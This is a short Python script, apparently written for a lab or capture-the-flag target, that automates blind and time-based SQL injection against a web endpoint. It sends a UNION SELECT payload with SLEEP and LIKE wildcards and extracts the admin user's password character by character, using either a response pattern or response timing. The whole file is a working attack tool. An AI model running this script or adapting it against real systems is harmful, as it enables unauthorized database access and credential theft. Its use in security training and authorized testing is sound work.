# Simple Script to help with Blind&Time Based SQL injections

import requests
import re

path = "http://10.10.99.28/run"
data = "level=4&sql=select * from analytics_referrers where domain='admin123' UNION SELECT 1,SLEEP(0.345) from users where username = 'admin' and password like 'FUZZ';--' LIMIT 1 "
headers = {"content-type": "application/x-www-form-urlencoded"}
successRegex = "\"message\":\"true\""
successTime = 0.345

current_results = ['']
index = 0
blacklist = ['_']

printable = "0123456789abcdefghijklmnopqrstuvwxyz_-"

print("Starting Fuzz on " + path)

averageTime = 0
for x in range(3):
	res = requests.post(path, data.replace("FUZZ", 'ezazerr'), headers=headers, verify=False)
	averageTime += res.elapsed.total_seconds()

averageTime = averageTime/3

while True:

	start_result = current_results[index]

	for c in printable:
		res = requests.post(path, data.replace("FUZZ", current_results[index] + c + '%'), headers=headers, verify=False)

		if(re.search(successRegex, res.text) != None):
			if(len(current_results[index]) == 0):
				blacklist.append(c)

			current_results[index] += c
			print(c, end="")
			break

		elif( res.elapsed.total_seconds() > successTime and res.elapsed.total_seconds() < successTime + (averageTime + successTime/20) ):
			if(len(current_results[index]) == 0):
				blacklist.append(c)

			current_results[index] += c
			print(c, end="")
			break

	if(current_results[index] == start_result):
		print('')

		current_results.append('')
		index += 1
		continueLoop = False

		for c in printable:
			if(c not in blacklist):
				res = requests.post(path, data.replace("FUZZ", current_results[index] + c + '%'), headers=headers, verify=False)

				if(re.search(successRegex, res.text) != None):
					blacklist.append(c)
					current_results[index] += c
					print(c, end="")

					continueLoop = True
					break
				elif( res.elapsed.total_seconds() > successTime and res.elapsed.total_seconds() < successTime + (successTime + successTime/10) ):
					blacklist.append(c)
					current_results[index] += c
					print(c, end="")

					continueLoop = True
					break

		if(not continueLoop):
			current_results.pop()
			break


print("Done Fuzz on " + path)
print("Found items: ")

for result in current_results:
	print(f"- {result}")

